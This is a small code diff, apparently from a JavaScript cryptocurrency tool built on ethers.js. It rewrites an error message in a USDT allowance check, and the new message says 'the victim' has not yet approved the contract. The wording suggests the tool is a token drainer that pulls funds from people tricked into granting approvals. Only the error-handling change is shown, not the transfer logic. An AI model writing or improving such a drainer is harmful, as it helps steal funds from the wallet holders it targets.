@@ -221,7 +221,7 @@
         }
 
         if (allowance.lt(amountParsed)) {
-          throw new Error(`INSUFFICIENT ALLOWANCE: Victim only approved ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
+          throw new Error(`INSUFFICIENT ALLOWANCE: The victim (${from}) has not approved the contract yet. Currently approved: ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
         }
 
         // --- PRE-FLIGHT DEBUGGING ---
